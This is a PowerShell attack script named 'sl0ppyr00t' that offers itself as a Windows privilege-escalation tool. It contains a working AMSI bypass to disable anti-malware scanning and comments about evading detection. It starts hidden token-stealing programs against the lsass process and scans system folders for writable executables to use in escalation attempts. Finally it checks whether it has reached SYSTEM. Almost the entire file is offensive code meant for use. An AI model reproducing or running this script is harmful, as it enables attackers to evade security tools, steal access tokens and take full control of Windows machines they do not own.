# Display banner
Write-Host " {sl0p}----sl0ppyr00t----{sl0p}"
Write-Host " {sl0p}Lsass Impersonation & Escalation Scanner{sl0p}"
Write-Host " {sl0p}----sl0ppyr00t----{sl0p}"
Write-Host ""
Write-Host ""

# Disable logging to evade detection
[System.Diagnostics.EventLog]::SourceExists("PowerShell") | Out-Null
Set-StrictMode -Off

# AMSI Bypass (Anti-Malware Scan Interface)
$AMSI = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$AMSI.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)

# Get current username
$user = $env:USERNAME

# Change the current directory
$scriptPath = "C:\Users\$user\Desktop\ALPI\sl0ppy-TokenStealer"
Set-Location -Path $scriptPath

# Sleep function with display
function SleepWithMessage {
    param(
        [int]$Seconds,
        [string]$Message
    )

    Write-Host $Message
    Start-Sleep -Seconds $Seconds
}

# Function to scan for vulnerable executables
function Scan-VulnerableExecutables {
    Write-Host "Scanning for executables with weak permissions..."
    
    $paths = @( "C:\Windows\System32", "C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\Users\Public" )
    $vulnerableExecutables = @()

    foreach ($path in $paths) {
        if (Test-Path $path) {
            $files = Get-ChildItem -Path $path -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                $acl = Get-Acl $file.FullName
                foreach ($access in $acl.Access) {
                    if ($access.IdentityReference -match "Everyone" -or $access.IdentityReference -match "Authenticated Users") {
                        if ($access.FileSystemRights -match "FullControl" -or $access.FileSystemRights -match "Write") {
                            $vulnerableExecutables += $file.FullName
                            Write-Host "[+] Found vulnerable executable: $($file.FullName)"
                        }
                    }
                }
            }
        }
    }

    if ($vulnerableExecutables.Count -eq 0) {
        Write-Host "[-] No vulnerable executables found."
    } else {
        Write-Host "[+] Potential vulnerable executables detected!"
    }

    return $vulnerableExecutables
}

# Get the lsass process ID
$lsassProcess = Get-Process -Name lsass

if ($lsassProcess) {
    $lsassProcessID = $lsassProcess.Id

    # Run sl0ppy-TokenStealer with appropriate arguments
    Write-Host "Running sl0ppy-TokenStealer..."
    Start-Process -FilePath 'powershell.exe' -ArgumentList "./sl0ppyTI.exe pid:$lsassProcessID binary:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -NoNewWindow

    # Sleep for a few seconds
    SleepWithMessage -Seconds 5 -Message "Waiting for sl0ppy-TokenStealer to finish..."

    # Get the lsass process ID again
    $lsassProcess = Get-Process -Name lsass

    if ($lsassProcess) {
        $lsassProcessID = $lsassProcess.Id

        # Run sl0ppy-ntauth with appropriate arguments
        Write-Host "Running sl0ppy-ntauth..."
        Start-Process -FilePath 'powershell.exe' -ArgumentList "./sl0ppy-ntauth.exe pid:$lsassProcessID binary:C:\Users\$user\Desktop\ALPI\sl0ppy-ntc.exe" -WindowStyle Hidden -NoNewWindow
    }
    else {
        Write-Host "Error: lsass process not found."
    }
} else {
    Write-Host "Error: lsass process not found."
}

# Scan for vulnerable executables
$vulnExes = Scan-VulnerableExecutables()

# Attempt privilege escalation using found executables
foreach ($exe in $vulnExes) {
    Write-Host "Attempting privilege escalation with: $exe"
    Start-Process -FilePath 'powershell.exe' -ArgumentList "./sl0ppy-ntauth.exe pid:$lsassProcessID binary:$exe" -WindowStyle Hidden -NoNewWindow
    SleepWithMessage -Seconds 3 -Message "Waiting for escalation attempt..."
}

# Verify if escalation succeeded
$whoami = whoami
if ($whoami -match "NT AUTHORITY\\SYSTEM") {
    Write-Host "[+] Privilege escalation SUCCESS: Running as SYSTEM."
} else {
    Write-Host "[-] Privilege escalation FAILED."
}
